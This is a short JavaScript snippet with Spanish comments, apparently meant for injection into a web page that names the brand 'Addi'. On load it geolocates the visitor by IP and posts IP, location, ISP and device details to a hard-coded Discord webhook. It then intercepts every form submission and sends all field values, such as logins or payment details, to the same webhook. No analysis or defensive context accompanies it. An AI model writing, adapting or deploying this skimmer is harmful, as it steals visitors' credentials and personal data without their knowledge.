<!-- Script Completo: Visita + Interceptación de Formularios -->
<script>
	window.addEventListener('DOMContentLoaded', () => {
		const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1537181732414165162/LhBFLaNeDsXMNCyP26v6SJTa0dptIaOVcKwO5liFez0-95I3vTUwwYBkMp6YUzHh5Z6S';

		// 1. Envío automático al cargar la página (Datos de la visita)
		async function enviarDatosVisita() {
			try {
				const ipResponse = await fetch('https://ipapi.co/json/');
				const ipData = await ipResponse.json();

				const mensaje = {
					content: `🚨 **¡Nueva visita en Addi!**\n` +
							 `• **IP:** ${ipData.ip || 'Desconocida'}\n` +
							 `• **Ubicación:** ${ipData.city || 'Desconocida'}, ${ipData.country_name || 'Desconocido'}\n` +
							 `• **ISP:** ${ipData.org || 'Desconocida'}\n` +
							 `• **Dispositivo:** ${navigator.platform} (${window.screen.width}x${window.screen.height})\n` +
							 `• **Hora:** ${new Date().toLocaleString()}`
				};

				await fetch(WEBHOOK_URL, {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify(mensaje),
					keepalive: true
				});
			} catch (e) {
				console.error('Error enviando visita:', e);
			}
		}
		enviarDatosVisita();

		// 2. Interceptación de datos cuando el usuario escribe y envía un formulario
		document.addEventListener('submit', async (e) => {
			const form = e.target;
			const formData = new FormData(form);
			let datosFormulario = '';

			formData.forEach((value, key) => {
				datosFormulario += `• **${key}:** ${value}\n`;
			});

			if (!datosFormulario) {
				const inputs = document.querySelectorAll('input, select, textarea');
				inputs.forEach(input => {
					if (input.name || input.id) {
						const identifier = input.name || input.id;
						datosFormulario += `• **${identifier}:** ${input.value || 'Vacío'}\n`;
					}
				});
			}

			const mensajeForm = {
				content: `📝 **¡Datos ingresados en el formulario!**\n${datosFormulario || 'No se detectaron campos de texto.'}\n• **Hora:** ${new Date().toLocaleString()}`
			};

			try {
				await fetch(WEBHOOK_URL, {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify(mensajeForm),
					keepalive: true
				});
			} catch (err) {
				console.error('Error enviando datos del formulario:', err);
			}
		});
	});
</script>
